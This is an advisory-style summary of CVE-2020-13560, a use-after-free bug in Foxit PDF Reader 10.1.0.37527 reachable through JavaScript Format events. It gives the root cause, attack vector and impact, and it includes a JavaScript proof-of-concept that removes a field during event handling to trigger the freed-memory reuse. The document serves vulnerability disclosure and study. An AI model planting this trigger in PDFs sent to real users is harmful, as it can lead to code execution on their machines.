```text
CVE-2020-13560: Foxit Reader JavaScript choice field format event use-after-free vulnerability

- Vulnerability: Use-after-free
- Root cause: A specially crafted PDF document can trigger reuse of previously freed memory due to improper handling of the `Format` event action in JavaScript. The vulnerability occurs because the event handler removes a field while the event handling is being concluded, leading to a use-after-free condition.
- Affected product: Foxit Softwareâ€™s Foxit PDF Reader, version 10.1.0.37527.
- Attack vector: An attacker needs to trick the user to open a malicious PDF file. If the browser plugin extension is enabled, visiting a malicious site can also trigger the vulnerability.
- Impact: Arbitrary code execution. An attacker can place additional Javascript code after freeing the memory, giving them a chance to take control of it to be reused. This can either lead to further memory corruption or arbitrary code execution.
- Example:
  ```javascript
  function main() {

  app.activeDocs[0].getField('Ch1').setAction("Format",'f();');
  app.activeDocs[0].getField('Ch1').setFocus();
  app.activeDocs[0].getField('Ch2').setFocus();

  }

  function f() {

  app.activeDocs[0].getField('Ch1').setFocus();
  app.activeDocs[0].getField('Ch2').setFocus();
  app.alert("before free");
  app.activeDocs[0].removeField("");
  app.alert("after free");
  }

  main();
  ```
```